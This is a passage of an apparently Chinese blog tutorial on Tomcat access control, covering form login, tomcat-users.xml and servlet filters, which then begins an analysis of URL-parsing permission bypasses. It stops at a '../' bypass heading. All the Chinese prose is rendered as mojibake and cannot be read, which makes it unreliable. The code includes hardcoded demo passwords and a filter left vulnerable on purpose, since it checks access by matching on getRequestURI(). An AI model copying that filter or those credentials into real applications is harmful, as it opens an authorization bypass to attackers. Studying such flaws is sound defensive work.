å¸Œæœ›æœåŠ¡å™¨ä¸ºä½ å¼ºåˆ¶æ‰§è¡Œçš„ä»»ä½•åˆå§‹åŒ–å‚æ•°å’Œå®¹å™¨ç®¡ç†çš„å®‰å…¨çº¦æŸã€‚ /WEB-INF/classes/ï¼šåº”ç”¨ç¨‹åºæ‰€éœ€çš„Javaç±»æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åç«¯å®ç°çš„åŒ…æ‹¬è·¯ç”±ç­‰çš„ä¸€äº›åŠŸèƒ½å®ç°çš„javaæ–‡ä»¶ã€‚ /WEB-INF/lib/ï¼šæ­¤ç›®å½•åŒ…å«JARæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯å½“å‰åº”ç”¨ç¨‹åºæ‰€éœ€ç¬¬ä¸‰æ–¹ç±»åº“ã€‚ åŸºæœ¬ä¿¡æ¯å¦‚ä¸Šï¼Œå…¶ä¸‹è¿˜æœ‰ä¸¤ä¸ªç‚¹éœ€è¦è¯´æ˜ï¼š\nideaä¸­çš„tomcatçš„å®ç°é€»è¾‘ï¼šå…¶å®å°±æ˜¯ç›¸å½“äºç›´æ¥åœ¨tomcatçš„webappsç›®å½•ä¸‹ç¼–å†™æ–‡ä»¶ï¼Œç„¶åç»è¿‡ä¸€äº›è°ƒç”¨ä»è€ŒæˆåŠŸå¯åŠ¨tomcatå®¹å™¨ã€‚ /WEB-INF/web.xmlæ–‡ä»¶è¯´æ˜ï¼šåœ¨å‰é¢æˆ‘ä»¬äº†è§£åˆ°äº†tomcatçš„/confç›®å½•ä¸‹ä¹Ÿä¼šå­˜åœ¨ä¸€ä¸ªweb.xmlæ–‡ä»¶ã€‚è¿™ä¸¤ä¸ªæ–‡ä»¶æœ‰ä»€ä¹ˆåŒºåˆ«å’Œè”ç³»å‘¢ï¼Œæ ¹æ®æˆ‘çš„ç†è§£ï¼Œ/confç›®å½•ä¸‹çš„web.xmlé…ç½®æ–‡ä»¶å¯¹å…¨å±€çš„ç¯å¢ƒè®¾ç½®èµ·ä½œç”¨ï¼Œè€Œä¸€ä¸ªtomcatå¯ä»¥æœ‰å¤šä¸ªåº”ç”¨ç¨‹åºï¼Œä¸å¯èƒ½æ¯ä¸€ä¸ªwebåº”ç”¨ç¨‹åºçš„filterã€servleté…ç½®é‚£äº›éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ•…éœ€è¦åœ¨å„è‡ªçš„WEB-INFç›®å½•ä¸‹å­˜æ”¾ä¸€ä¸ªweb.xmlé…ç½®æ–‡ä»¶æ¥å®šä¹‰å„è‡ªéœ€è¦çš„é…ç½®ï¼Œå¹¶ä¸”åªä¼šåœ¨è‡ªå·±çš„åº”ç”¨ç¨‹åºä¸­ç”Ÿæ•ˆã€‚ tomcatæ¶æ„å­¦ä¹  å…³äºtomcatæ¶æ„çš„çŸ¥è¯†ç‚¹ä»¥åŠç®€å•çš„jspæŠ€æœ¯å¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰çš„tomcatå†…å­˜é©¬æ–‡ç« çš„åŸºç¡€çŸ¥è¯†æ¿å—çš„çŸ¥è¯†ç‚¹ï¼š\nhttps://fupanc-w1n.github.io/p/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/\næƒé™è®¾ç½® æ¥çœ‹çœ‹tomcatçš„ä¸€äº›æƒé™è®¾ç½®æ–¹æ³•ã€‚\nè´¦å¯†+web.xml+jsp æœ€å¸¸è§çš„å°±æ˜¯ç”¨æˆ·åç™»é™†ï¼Œåœ¨ç®€å•äº†è§£ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é…ç½®tomcatçš„useré…ç½®æ–‡ä»¶æ¥è¿›è¡Œç”¨æˆ·è®¾ç½®ï¼Œæ¯”å¦‚å¦‚ä¸‹è¿‡ç¨‹è®¾ç½®ï¼š\nå…ˆåœ¨tomcatæºç çš„confç›®å½•ä¸‹å¾€tomcat-users.xmlæ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š\n1 \u0026lt;user username=\u0026#34;admin\u0026#34; password=\u0026#34;123456\u0026#34; roles=\u0026#34;manager-gui\u0026#34;/\u0026gt; è®¾ç½®äº†ä¸€ä¸ªç”¨æˆ·åå’Œå¯†ç ï¼Œéœ€è¦é…åˆweb.xmlæ¥è¿›è¡Œè§„åˆ™åŒ¹é…ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\u0026#34; version=\u0026#34;4.0\u0026#34;\u0026gt; \u0026lt;security-constraint\u0026gt; \u0026lt;web-resource-collection\u0026gt; \u0026lt;web-resource-name\u0026gt;Admin Pages\u0026lt;/web-resource-name\u0026gt; \u0026lt;!-- é™åˆ¶ admin/ ç›®å½•ä¸‹æ‰€æœ‰ JSP --\u0026gt; \u0026lt;url-pattern\u0026gt;/admin/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/web-resource-collection\u0026gt; \u0026lt;auth-constraint\u0026gt; \u0026lt;!-- åªæœ‰ manager-gui ç”¨æˆ·æ‰èƒ½è®¿é—® --\u0026gt; \u0026lt;role-name\u0026gt;manager-gui\u0026lt;/role-name\u0026gt; \u0026lt;/auth-constraint\u0026gt; \u0026lt;/security-constraint\u0026gt; \u0026lt;login-config\u0026gt; \u0026lt;auth-method\u0026gt;FORM\u0026lt;/auth-method\u0026gt; \u0026lt;form-login-config\u0026gt; \u0026lt;form-login-page\u0026gt;/login.jsp\u0026lt;/form-login-page\u0026gt; \u0026lt;form-error-page\u0026gt;/login_error.jsp\u0026lt;/form-error-page\u0026gt; \u0026lt;/form-login-config\u0026gt; \u0026lt;/login-config\u0026gt; \u0026lt;security-role\u0026gt; \u0026lt;role-name\u0026gt;manager-gui\u0026lt;/role-name\u0026gt; \u0026lt;/security-role\u0026gt; \u0026lt;/web-app\u0026gt; åœ¨è¿™é‡Œè®¾ç½®äº†å¯¹adminç›®å½•çš„è®¿é—®é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯é™åˆ¶äº†index.jspæ–‡ä»¶çš„è®¿é—®ï¼Œç„¶åå°±æ˜¯è®¾ç½®æ–‡ä»¶ï¼Œç›®å½•ç»“æ„ä¸ºï¼š\nLogin.jspæ–‡ä»¶å†…å®¹ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;ç™»å½•\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h2\u0026gt;ç®¡ç†å‘˜ç™»å½•\u0026lt;/h2\u0026gt; \u0026lt;form method=\u0026#34;post\u0026#34; action=\u0026#34;j_security_check\u0026#34;\u0026gt; ç”¨æˆ·å: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;j_username\u0026#34; /\u0026gt;\u0026lt;br/\u0026gt; å¯†ç : \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;j_password\u0026#34; /\u0026gt;\u0026lt;br/\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;ç™»å½•\u0026#34;/\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; è¿™é‡Œçš„j_security_checkæ˜¯tomcatå†…ç½®çš„ç™»é™†æ ¡éªŒæœºåˆ¶ï¼Œå¯¹åº”çš„è´¦å·å¯†ç å°±æ˜¯å‰é¢çš„é…ç½®æ–‡ä»¶ä¸­è®¾ç½®çš„è´¦å·å¯†ç ã€‚\nadminç›®å½•ä¸‹çš„index.jspå†…å®¹ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;%-- Created by IntelliJ IDEA. User: ASUS Date: 2024/8/30 Time: 13:00 To change this template use File | Settings | File Templates. --%\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Hello admin\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Login_error.jspæ–‡ä»¶å†…å®¹ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;ç™»å½•å¤±è´¥\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h2\u0026gt;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼\u0026lt;/h2\u0026gt; \u0026lt;a href=\u0026#34;login.jsp\u0026#34;\u0026gt;è¿”å›é‡æ–°ç™»å½•\u0026lt;/a\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ç„¶åå¼€å¯tomcatå³å¯ï¼Œç„¶åè®¿é—®adminå—é™ç›®å½•ä¸‹çš„index.jspï¼Œä¼šè·³è½¬åˆ°login.jspè¦æ±‚ç™»é™†ï¼š\nç„¶åè¾“å…¥admin:123456å°±å¯ä»¥æˆåŠŸè®¿é—®äº†ï¼š\ntomcatè®¾ç½®cookieçš„æƒ…å†µå¦‚ä¸‹ï¼š\nç”±æ­¤å®ç°äº†ä¸€æ¬¡ç®€å•çš„ç”¨æˆ·è´¦å·ç™»é™†çš„å®ç°ï¼Œå¹¶ä¸”å®ç°äº†è®¿é—®jspèµ„æºæ—¶å¯¹èº«ä»½çš„é™åˆ¶ã€‚å½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨æ•°æ®åº“æ¥è¿›è¡Œèº«ä»½è¯†åˆ«ä¸é™åˆ¶ï¼Œä½†ä¸»è¦æ˜¯ç”±javaä»£ç å®ç°ã€‚\nå½“ç„¶è¿˜å¯ä»¥é™åˆ¶ipç­‰æ“ä½œï¼Œä½†éƒ½æ˜¯éœ€è¦ç»“åˆåˆ°xmlé…ç½®æ–‡ä»¶æ¥åˆ©ç”¨ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nfilterè¿‡æ»¤å™¨çš„åˆ©ç”¨ åœ¨tomcatæ¶æ„ä¸­ï¼Œæˆ‘ä»¬å°±äº†è§£åˆ°äº†å¯ä»¥ä½¿ç”¨filteræ¥è¿‡æ»¤è¯·æ±‚ï¼Œåªè®©ç¬¦åˆæ¡ä»¶çš„æ‰èƒ½ç»§ç»­è°ƒç”¨filterChain.doFilter()ï¼Œå¦åˆ™å°±ä¼šè¢«æ‹¦æˆªã€‚è¿™å°±æ˜¯ä¸€ä¸ªå¤©ç„¶å¯ä»¥è¢«è®¾è®¡ç”¨æ¥è¿›è¡Œæƒé™éªŒè¯çš„è¿‡æ»¤å™¨ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥åšå…¶ä»–å¤„ç†ï¼‰ã€‚\nåœ¨è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ä»…ä½¿ç”¨javaæ–‡ä»¶æ¥è¿›è¡Œä¸€æ¬¡ç™»é™†éªŒè¯æ¨¡æ‹Ÿã€‚\nåœ¨ideaä¸­æŒ‡å®šçš„æºæ ¹ç¼–è¾‘javaæ–‡ä»¶å³å¯ï¼š\nè¿™é‡Œçš„ç›®çš„è¿˜æ˜¯è®¿é—®åˆ°adminä¸‹çš„index.jspæ–‡ä»¶ï¼ŒLoginServletæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package org.example; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; @WebServlet(\u0026#34;/login\u0026#34;) public class LoginServlet extends HttpServlet { @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { String username = request.getParameter(\u0026#34;username\u0026#34;); String password = request.getParameter(\u0026#34;password\u0026#34;); if (\u0026#34;admin\u0026#34;.equals(username) \u0026amp;\u0026amp; \u0026#34;123\u0026#34;.equals(password)) { HttpSession session = request.getSession(); session.setAttribute(\u0026#34;username\u0026#34;, username); response.sendRedirect(request.getContextPath() + \u0026#34;/admin/index.jsp\u0026#34;); } else { response.sendRedirect(request.getContextPath() + \u0026#34;/login.jsp\u0026#34;); } } } ç¡¬ç¼–ç äº†ä¸€ä¸ªè´¦å·å¯†ç ï¼Œå½“ç„¶å¯ä»¥ç»“åˆåˆ°æ•°æ®åº“æ¥ä½¿ç”¨ã€‚ç„¶åTestfilter.javaæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 package org.example; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; @WebFilter(\u0026#34;/admin/*\u0026#34;) public class Testfilter implements Filter { @Override public void init(FilterConfig filterConfig) throws ServletException { System.out.println(\u0026#34;Testfilter init\u0026#34;); } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse resp = (HttpServletResponse) servletResponse; HttpSession session = request.getSession(false); if (session == null) { resp.sendRedirect(request.getContextPath()+\u0026#34;/login.jsp\u0026#34;); return; } String username = session.getAttribute(\u0026#34;username\u0026#34;).toString(); if(\u0026#34;admin\u0026#34;.equals(username)){ filterChain.doFilter(servletRequest, servletResponse); }else{ resp.sendRedirect(request.getContextPath()+\u0026#34;/login.jsp\u0026#34;); } } @Override public void destroy() { } } å¯ä»¥çœ‹åˆ°å¯¹adminè·¯ç”±ä¸‹çš„å†…å®¹è¿›è¡Œäº†é™åˆ¶ï¼Œç„¶åå¯¹cookieçš„è·å–è¿›è¡Œäº†ä¸€äº›æ¡ä»¶åˆ¤æ–­ã€‚ä¿®æ”¹login.jspæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;ç™»å½•\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h2\u0026gt;ç®¡ç†å‘˜ç™»å½•\u0026lt;/h2\u0026gt; \u0026lt;form method=\u0026#34;post\u0026#34; action=\u0026#34;login\u0026#34;\u0026gt; ç”¨æˆ·å: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; /\u0026gt;\u0026lt;br/\u0026gt; å¯†ç : \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; /\u0026gt;\u0026lt;br/\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;ç™»å½•\u0026#34;/\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å°†postå‘é€çš„actionæ”¹ä¸ºäº†åç«¯å¤„ç†çš„loginè·¯ç”±ã€‚å¯ä»¥æ¸…ç©ºä¸€ä¸‹web.xmlè®¾ç½®çš„é…ç½®ï¼Œä¿ç•™æœ€åŸºæœ¬çš„å³å¯ï¼š\n1 2 3 4 5 6 7 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\u0026#34; version=\u0026#34;4.0\u0026#34;\u0026gt; \u0026lt;/web-app\u0026gt; ç„¶åå¯åŠ¨tomcatå³å¯ï¼Œè®¿é—®admin/index.jspï¼Œä¼šç›´æ¥è·³è½¬åˆ°ç™»é™†é¡µé¢ï¼š\nç„¶åå°è¯•ç™»é™†ï¼Œé”™è¯¯è´¦å·å¯†ç ï¼š\næ­£ç¡®è´¦å·å¯†ç ï¼š\nä¼šè·³è½¬åˆ°æŒ‡å®šçš„admin/index.jspï¼Œåœ¨å‰ç«¯æ‹¿åˆ°cookieå†è®¿é—®ï¼š\nåˆ å»cookieï¼š\nä¸¤ç›¸å¯¹æ¯”ï¼ŒæˆåŠŸé€šè¿‡filterè®¾ç½®çš„æƒé™éªŒè¯ã€‚\nä»¥ä¸Šå®ç°äº†ä¸€ä¸ªç®€å•çš„javaå±‚é¢çš„åˆ©ç”¨filterè¿‡æ»¤å™¨æ¥å¯¹è·¯ç”±è®¾ç½®èº«ä»½éªŒè¯ï¼Œé‡ç‚¹å°±åœ¨äºè¿™é‡Œä½¿ç”¨çš„@WebFilteræ³¨è§£ï¼Œæƒ³å½“äºweb.xmlä¸­çš„\u0026lt;filter\u0026gt; å’Œ\u0026lt;filter-mapping\u0026gt;ï¼Œæ•…ä¹Ÿæ˜¯å¯ä»¥ç”¨web.xmlæ¥æ ‡æ³¨filterä½œç”¨çš„è·¯ç”±çš„ã€‚\néœ€è¦æ³¨æ„çš„ä¸€ç‚¹å°±æ˜¯ä½¿ç”¨@WebFilteræ³¨è§£æ— æ³•å¯¹filterè¿›è¡Œæ’åºï¼Œè€Œweb.xmlå¯ä»¥ã€‚\nç»å…¸æƒé™ç»•è¿‡åˆ†æ å‰æ–‡æˆ‘ä»¬ç®€å•äº†è§£äº†ä¸€ä¸‹ä¸¤ç§æƒé™è®¾ç½®çš„æ–¹æ³•ï¼Œå½“ç„¶è¿˜å¯èƒ½å­˜åœ¨æ›´å¤šã€æ›´å¤æ‚çš„æƒé™è®¾ç½®ï¼Œè¿™é‡Œæ¥åˆ†æä¸€ä¸‹æ—©å·²æœ‰æ‰€è€³é—»çš„åˆ†å·ç­‰æ–¹å¼çš„ç»•è¿‡ã€‚\nè¿™é‡Œä¸»è¦åˆ©ç”¨çš„æ˜¯URLè§£æçš„å·®å¼‚æ€§ï¼Œå½“åç«¯ä½¿ç”¨getRequestURI()æˆ–getRequestURL()å‡½æ•°æ¥è§£æç”¨æˆ·è¯·æ±‚çš„URLæ—¶ï¼Œè‹¥URlä¸ŠåŒ…å«æœ‰ä¸€äº›ç‰¹æ®Šç¬¦å·ï¼Œåˆ™å¯èƒ½é€ æˆè®¿é—®é™åˆ¶ç»•è¿‡çš„é£é™©ã€‚\nåœ¨tomcatä¸­ï¼Œè‡³å°‘å­˜åœ¨å¦‚ä¸‹å‡ ä¸ªå‡½æ•°å¯ä»¥ç”¨æ¥è·å–urlä¸Šçš„è¯·æ±‚è·¯ç”±ï¼š\nreq.getRequestURL()ï¼šè¿”å›å…¨è·¯å¾„ req.getRequestURI()ï¼šè¿”å›é™¤hostçš„è·¯å¾„ req.getContextPath()ï¼šè¿”å›å·¥ç¨‹åéƒ¨åˆ†çš„è·¯å¾„ req.getServletPath()ï¼šè¿”å›é™¤å»Hostå’Œå·¥ç¨‹åéƒ¨åˆ†çš„è·¯å¾„ ç”±äºtomcatåœ¨è§£æè¯·æ±‚è·¯å¾„æ—¶ï¼Œä¼šè‡ªè¡Œä¿®æ­£è·¯å¾„ï¼Œç„¶åå†å»è®¿é—®servletï¼Œæ•…ä¸€èˆ¬å­˜åœ¨æƒé™ç»•è¿‡æ¼æ´ï¼Œéƒ½æ˜¯å› ä¸ºåç«¯å¼€å‘å¯¹è·¯å¾„çš„é™åˆ¶æ²¡æœ‰åšå¥½ã€‚\nç®€å•åœ¨doFilter()æ–¹æ³•ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç æ¥çœ‹å›æ˜¾æ˜¯ä»€ä¹ˆï¼š\n1 2 3 4 resp.getWriter().write(\u0026#34;getRequestURL()çš„å›æ˜¾\u0026#34;+req.getRequestURL().toString()+\u0026#34;\u0026lt;br\u0026gt;\u0026#34;); resp.getWriter().write(\u0026#34;getRequestURI()çš„å›æ˜¾\u0026#34;+req.getRequestURI()+\u0026#34;\u0026lt;br\u0026gt;\u0026#34;); resp.getWriter().write(\u0026#34;getContextPath()çš„å›æ˜¾\u0026#34;+req.getContextPath()+\u0026#34;\u0026lt;br\u0026gt;\u0026#34;); resp.getWriter().write(\u0026#34;getServletPath()çš„å›æ˜¾\u0026#34;+req.getServletPath()+\u0026#34;\u0026lt;br\u0026gt;\u0026#34;); ä»webç«¯çš„å›æ˜¾æ¥çœ‹ï¼Œæ˜¯å¦‚ä¸‹å†…å®¹ï¼š\n1 2 3 4 getRequestURL()çš„å›æ˜¾http://localhost:8081/tomcat002_Web_exploded/admin/index.jsp getRequestURI()çš„å›æ˜¾/tomcat002_Web_exploded/admin/index.jsp getContextPath()çš„å›æ˜¾/tomcat002_Web_exploded getServletPath()çš„å›æ˜¾/admin/index.jsp éå¸¸ç¬¦åˆå‡½æ•°æœ¬èº«çš„å®šä¹‰ã€‚\nå‰é¢æˆ‘ä»¬ä¹Ÿè¯´äº†ï¼Œå­˜åœ¨æƒé™ç»•è¿‡çš„åŸå› å°±æ˜¯å› ä¸ºä½¿ç”¨äº†getRequestURL()æˆ–è€…getRequestURI()æ¥è·å–è·¯å¾„ï¼Œç„¶åå†å¯¹ç›®å½•è¿›è¡Œåˆ¤æ–­ã€‚\nç®€å•å†™ä¸€ä¸ªdemoæ¥å¯¹ä¸€äº›ç»•è¿‡ç‚¹è¿›è¡Œåˆ†æã€‚\nç›®å½•ç»“æ„æ²¡æœ‰å¤ªå¤§å˜åŒ–ï¼Œæ–‡ä»¶å†…å®¹æ”¹å˜å¦‚ä¸‹ï¼š\nLoginServlet.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package org.example; import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; public class LoginServlet extends HttpServlet { protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { HttpSession session = request.getSession(); String username = request.getParameter(\u0026#34;username\u0026#34;); if (username == null) { response.getWriter().write(\u0026#34;You are not logged in\u0026#34;); return; } if (\u0026#34;admin\u0026#34;.equals(username)) { session.setAttribute(\u0026#34;user\u0026#34;, username); response.sendRedirect(request.getContextPath() + \u0026#34;/admin/index.jsp\u0026#34;); } else { response.getWriter().write(\u0026#34;Invalid username\u0026#34;); } } } Testfilter.javaæ–‡ä»¶å†…å®¹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package org.example; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; @WebFilter(\u0026#34;/admin/*\u0026#34;) public class Testfilter implements Filter { @Override public void init(FilterConfig filterConfig) throws ServletException { System.out.println(\u0026#34;Testfilter init\u0026#34;); } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest req = (HttpServletRequest) servletRequest; HttpServletResponse resp = (HttpServletResponse) servletResponse; //æ¼æ´ç‚¹ String requestURL = req.getRequestURI(); if(requestURL.startsWith(\u0026#34;/tomcat002_Web_exploded/admin/login\u0026#34;)) { //å¯¹ç™»å½•é¡µé¢è®¾ç½®ç™½åå• filterChain.doFilter(servletRequest, servletResponse); } else if(requestURL.endsWith(\u0026#34;.jsp\u0026#34;)) { //å¯¹adminé¡µé¢è¿›è¡Œé™åˆ¶ Object user = req.getSession().getAttribute(\u0026#34;user\u0026#34;); if(user == null || !user.toString().equals(\u0026#34;admin\u0026#34;)) { resp.getWriter().write(\u0026#34;please login\u0026#34;); return; } filterChain.doFilter(servletRequest, servletResponse); } } @Override public void destroy() { } } ç„¶åæ”¹äº†ä¸€ä¸‹WEB-INF/web.xmlæ–‡ä»¶å†…å®¹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\u0026#34; version=\u0026#34;4.0\u0026#34;\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;admin\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/admin/login\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;admin\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;org.example.LoginServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;/web-app\u0026gt; æ•´ä¸ªä»£ç å®ç°çš„åŠŸèƒ½å°±æ˜¯å¯¹/adminè·¯ç”±ä¸‹çš„èµ„æºè®¾ç½®äº†filterè¿‡æ»¤å™¨ï¼Œç„¶åç”¨è¿‡é…ç½®web.xmlæ–‡ä»¶ä»è€Œä½¿urlä¸Šè®¿é—®admin/loginä¼šè½¬äº¤ç»™æœ¬åœ°å®ç°çš„servletè¿›è¡Œé€»è¾‘å®ç°ï¼ˆè¿™æ ·å°±å¯ä»¥è®©loginåœ¨filterè¿‡æ»¤ä¸‹ï¼Œæ­£å¸¸å®ç°filterçš„è¿‡æ»¤åŠŸèƒ½ï¼‰ï¼Œç„¶åè®¾ç½®çš„è·å–admin/index.jspæ–‡ä»¶éœ€è¦sessionä¸ºadminã€‚\næ³¨æ„è¿™é‡Œå¼ºåˆ¶è®¾ç½®äº†å¦‚æœæƒ³æ­£å¸¸è®¿é—®.jspæ–‡ä»¶ï¼Œå¿…é¡»åŒ…å«æœ‰è¿™ä¸ªåç¼€ï¼Œå¦åˆ™æ˜¯å›æ˜¾ä¸ºç©ºçš„ã€‚\nåœ¨è‡ªå®šä¹‰çš„filterä¸­ï¼Œä»é€»è¾‘çœ‹ä¼¼ä¹æ˜¯æ— æ‡ˆå¯å‡»ï¼Œä½†å…¶å®å­˜åœ¨éå¸¸ä¸¥é‡çš„æƒé™ç»•è¿‡æ¼æ´ï¼Œå…³é”®å°±æ˜¯tomcatä¼šè‡ªè¡Œä¿®æ­£è·¯å¾„ï¼Œè¿™ä¸tomcatçš„æºç å®ç°ç›¸å…³ã€‚ç°åœ¨å…ˆæ¥çœ‹æ­£å¸¸çš„é€»è¾‘ï¼š\nç›´æ¥è®¿é—®adminç•Œé¢ï¼š\nåœ¨filterè¿‡æ»¤å™¨å°±è¢«æ‹¦ä½ã€‚å°è¯•ç™»é™†ï¼š\nåœ¨servletçš„doGet()æ–¹æ³•åšå‡ºçš„åˆ¤æ–­ã€‚æ­£å¸¸ç™»é™†åï¼š\nè·å–åˆ°äº†sessionç„¶åä¼šè·³è½¬ã€‚æ‹¿åˆ°cookieåå°±å¯ä»¥è®¿é—®äº†ï¼š\nç”±æ­¤æˆåŠŸå®ç°é‰´æƒï¼Œå¯ä»¥è®¿é—®åˆ°å¯¹åº”çš„adminçš„å†…å®¹ã€‚\nä»ä¸Šè¿°è¿‡ç¨‹ä¸­ï¼Œåœ¨ä»£ç å±‚é¢å¯ä»¥è¯´è¿™ä¸ªé‰´æƒæ–¹å¼æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œä½†æ˜¯ç»“åˆåˆ°tomcatå°±ä¸ä¸€æ ·äº†ï¼Œä¸‹é¢æ¥äº†è§£ä¸€äº›ç»•è¿‡æ–¹å¼ã€‚\n../ç»•è¿‡ 